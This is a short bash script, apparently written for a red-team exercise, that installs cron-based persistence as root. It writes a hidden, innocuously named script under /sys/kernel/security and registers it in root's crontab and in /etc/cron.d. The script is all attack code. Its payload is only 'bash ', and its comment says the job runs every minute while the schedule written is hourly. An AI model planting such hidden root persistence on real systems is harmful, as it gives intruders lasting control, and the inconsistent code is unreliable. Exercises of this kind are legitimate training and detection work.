#!/bin/bash
# Blue team indicator: suspicious cron entries

CALLBACK_SCRIPT="/sys/kernel/security/.tmp_cleaner.sh"

# Create a very obvious keepalive script
cat > "$CALLBACK_SCRIPT" << 'EOF'
#!/bin/bash
bash 
EOF

chmod +x "$CALLBACK_SCRIPT"

# Add to root crontab - runs every minute (very noisy/detectable)
(crontab -l 2>/dev/null; echo "10 * * * * $CALLBACK_SCRIPT") | crontab -

# Also drop in /etc/cron.d for visibility
cat > /etc/cron.d/cronos << EOF
* * * * * root $CALLBACK_SCRIPT
EOF

echo "[RED TEAM] Cron persistence installed"